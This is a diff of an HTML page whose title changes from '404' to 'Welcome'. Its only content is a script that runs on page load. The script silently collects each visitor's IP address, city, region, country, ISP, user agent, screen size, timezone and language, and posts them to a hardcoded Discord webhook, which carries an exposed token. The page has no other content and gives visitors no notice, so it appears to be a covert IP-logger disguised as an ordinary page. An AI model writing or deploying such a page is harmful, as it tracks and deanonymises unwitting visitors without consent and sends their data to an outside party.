@@ -1,47 +1,53 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>404</title>
+  <meta charset="UTF-8">
+  <title>Welcome</title>
 </head>
 <body>
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1358463192233279690/ts2MmCoUQZyQh6H3Tr7GUBcwXd0llxnqBcXp6h6JdMxZTDG5r3o5Jx8DmD6Pq2hmqngN";
+    const webhookURL = "https://discord.com/api/webhooks/1358463192233279690/ts2MmCoUQZyQh6H3Tr7GUBcwXd0llxnqBcXp6h6JdMxZTDG5r3o5Jx8DmD6Pq2hmqngN"; // Replace this
 
-    
+    // For index.html, we just use a generic name
+    const name = "General";
+
     fetch("https://api.ipify.org?format=json")
-      .then(response => response.json())
+      .then(res => res.json())
       .then(ipData => {
         const ip = ipData.ip;
 
-        
         fetch(`https://ipapi.co/${ip}/json/`)
-          .then(response => response.json())
-          .then(locationData => {
-            const location = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
-            const isp = locationData.org || "Unknown ISP";
-            const userAgent = navigator.userAgent;
+          .then(res => res.json())
+          .then(data => {
+            const { city, region, country_name, org } = data;
+            const ua = navigator.userAgent;
+            const screenSize = `${screen.width}x${screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const lang = navigator.language;
+            const time = new Date().toLocaleString();
 
-            
             const message = {
-              content: `🌐 New visitor to TheLocusclothing:
-IP: ${ip}
-Location: ${location}
-ISP: ${isp}
-User-Agent: ${userAgent}`
+              content: `📡 **Page Visit Tracked**
+
+**Who:** ${name}
+**IP:** ${ip}
+**City:** ${city}
+**Region:** ${region}
+**Country:** ${country_name}
+**ISP:** ${org}
+**User-Agent:** ${ua}
+**Screen:** ${screenSize}
+**Timezone:** ${timezone}
+**Language:** ${lang}
+**Time:** ${time}`
             };
 
             fetch(webhookURL, {
               method: "POST",
-              headers: {
-                "Content-Type": "application/json"
-              },
+              headers: { "Content-Type": "application/json" },
               body: JSON.stringify(message)
             });
           });
-      })
-      .catch(error => {
-        console.error("Error 404:", error);
       });
   </script>
 </body>
